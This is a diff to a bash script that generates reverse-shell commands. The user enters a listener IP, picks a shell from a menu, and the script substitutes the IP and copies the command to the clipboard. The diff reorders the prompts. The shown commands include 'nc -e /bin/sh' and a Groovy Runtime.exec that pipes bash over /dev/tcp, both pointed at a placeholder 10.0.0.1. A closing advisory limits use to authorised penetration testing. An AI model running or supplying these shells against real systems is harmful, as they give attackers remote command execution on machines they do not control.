@@ -10,24 +10,25 @@ commands=(
     "nc -e /bin/sh 10.0.0.1 1234"
     "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
 )
-echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
-# Ask the user for the IP address
-read -p "Enter the IP for the shells: " ip_address
-
-# Replace the placeholder IP with the user-provided IP
-for i in "${!commands[@]}"; do
-    commands[$i]="${commands[$i]//10.0.0.1/$ip_address}"
-done
 
 # Display the options
 echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
-echo -e "\033[1;31mSelect a command to copy to clipboard:\033[0m"
+echo -e "\033[1;31mSelect the shell you want to generate:\033[0m"
 for i in "${!options[@]}"; do
     echo -e "\033[1;32m$((i+1)). ${options[i]}\033[0m"
 done
 
 # Read the user's choice
 read -p "Enter the number of your choice: " choice
+
+# Ask the user for the IP address
+echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
+read -p "Enter the IP for the shells: " ip_address
+
+# Replace the placeholder IP with the user-provided IP
+for i in "${!commands[@]}"; do
+    commands[$i]="${commands[$i]//10.0.0.1/$ip_address}"
+done
 
 # Validate the choice and copy to clipboard
 if [[ "$choice" -gt 0 && "$choice" -le "${#options[@]}" ]]; then
@@ -44,4 +45,3 @@ fi
 
 echo -e "\n\033[1;37m_________________________________________________________\033[0m\n"
 echo -e "\033[1;36mADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.\033[0m"
-
